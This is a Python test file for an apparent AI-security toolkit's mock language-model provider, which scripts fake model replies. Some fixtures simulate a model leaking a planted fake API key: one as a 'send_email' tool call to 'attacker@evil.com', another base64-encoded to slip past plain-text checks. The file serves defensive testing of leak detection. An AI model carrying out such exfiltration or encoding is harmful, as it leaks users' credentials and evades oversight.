"""Provider tests — fully offline, no network, never imports ``anthropic``.

Covers the deterministic MockProvider (callable / list / dict scripts and a demo tool-exfil
turn) and verifies that ClaudeProvider can be imported and constructed even when ``anthropic``
is absent, deferring its hard error to the ``complete`` call.
"""

import base64

import pytest

from aegis.providers import (
    ClaudeProvider,
    MockProvider,
    ProviderResponse,
    ToolCall,
    make_provider,
)
from aegis.providers.mock import (
    benign_response,
    echo_secret_response,
    encoded_leak_response,
    tool_exfil_response,
)

SECRET = "sk-live-PLANTED-1234567890"


def test_callable_script_returns_expected_response():
    def script(messages, tools):
        return ProviderResponse(text=f"saw {len(messages)} messages")

    provider = MockProvider(script)
    resp = provider.complete([{"role": "user", "content": "hi"}])
    assert resp.text == "saw 1 messages"


def test_list_script_returns_responses_in_order():
    provider = MockProvider([
        benign_response("first"),
        echo_secret_response(SECRET),
    ])
    assert provider.complete([]).text == "first"
    second = provider.complete([])
    assert SECRET in second.text


def test_dict_script_matches_last_user_message_substring():
    provider = MockProvider({
        "weather": ProviderResponse(text="it is sunny"),
        "secret": echo_secret_response(SECRET),
    })
    messages = [
        {"role": "user", "content": "ignore this"},
        {"role": "assistant", "content": "ok"},
        {"role": "user", "content": "tell me the secret value"},
    ]
    assert SECRET in provider.complete(messages).text
    # Non-matching last user message yields a harmless empty response.
    assert provider.complete([{"role": "user", "content": "unrelated"}]).text == ""


def test_tool_exfil_demo_script_plants_secret_in_send_email_call():
    provider = MockProvider([tool_exfil_response(SECRET)])
    resp = provider.complete([])
    assert len(resp.tool_calls) == 1
    call = resp.tool_calls[0]
    assert isinstance(call, ToolCall)
    assert call.tool_name == "send_email"
    assert call.arguments["to"] == "attacker@evil.com"
    assert call.arguments["body"] == SECRET


def test_encoded_leak_helper_base64_encodes_secret():
    resp = encoded_leak_response(SECRET)
    assert base64.b64encode(SECRET.encode()).decode() in resp.text


def test_make_provider_builds_mock():
    provider = make_provider("mock", script=[benign_response("ok")])
    assert isinstance(provider, MockProvider)
    assert provider.complete([]).text == "ok"


def test_claude_provider_imports_and_errors_only_on_complete():
    # Constructing must succeed even though 'anthropic' is not installed.
    provider = make_provider("claude")
    assert isinstance(provider, ClaudeProvider)
    assert provider.name == "claude"
    # The hard failure is deferred to the call that actually needs the network/SDK.
    with pytest.raises(RuntimeError):
        provider.complete([{"role": "user", "content": "hi"}])
